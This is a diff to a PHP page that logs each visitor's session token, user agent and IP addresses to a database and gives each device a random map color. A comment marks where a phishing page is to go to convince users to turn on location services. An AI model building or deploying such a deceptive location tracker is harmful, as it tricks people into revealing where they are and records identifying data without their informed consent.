@@ -9,7 +9,7 @@
 		// Create session variable
 		$_SESSION['token'] = random_str(45); // Length of 45 chars, default alphanumeric keyspace
 		// Add the thing to the database
-		$sql = "INSERT INTO devices (token, user_agent, ip_remote_addr, ip_forwarded_for) VALUES (:token, :user_agent, :ip_remote_addr, :ip_forwarded_for);";
+		$sql = "INSERT INTO devices (token, user_agent, ip_remote_addr, ip_forwarded_for, color) VALUES (:token, :user_agent, :ip_remote_addr, :ip_forwarded_for, :color);";
 		$stmt = $conn->prepare($sql); // We get $conn from auth/database.php
 
 		// Always bind parameters, SQL injection is so 2003
@@ -17,17 +17,19 @@
 		$stmt->bindParam(":user_agent", $_SERVER['HTTP_USER_AGENT']); // UserAgent header string
 		$stmt->bindParam(":ip_remote_addr", $_SERVER['REMOTE_ADDR']); // The address the connection was made from
 		$stmt->bindParam(":ip_forwarded_for", $_SERVER['HTTP_X_FORWARDED_FOR']); // An HTTP header sometimes set by proxy servers -- if set do not implicitly trust
+		$color = random_color();
+		$stmt->bindParam(":color", $color); // random_color is from token.php, this is the color the line will be on the map. Random (obviously) by default.
 
 		if ($stmt->execute()) {
-			$color = "green";
-			$message = "Success!";
+			$msg_color = "green";
+			$message = "SQL statement executed.";
 		} else {
-			$color = "red";
-			$message = "Nope";
+			$msg_color = "red";
+			$message = "SQL statement failed.";
 		} 
 	} else { // You've already got a session
-		$color = "green";
-		$message = "Success!";
+		$msg_color = "green";
+		$message = "SQL statement not run, user has a session token.";
 	}
 ?>
 
@@ -62,6 +64,7 @@ $(document).ready(function() {
 <body>
 	<!-- Add your phishing page here to try and convince the user to allow location -->
 	<h1>Turn on location services</h1>
-	<h2 style="color: <?php echo $color ?>"><?php echo $message ?></h2>
+	<h2 style="color: <?php echo $msg_color ?>"><?php echo $message ?></h2>
+	<h2 style="color: <?php echo $color ?>">Color: <?php echo $color ?></h2>
 </body>
 </html>
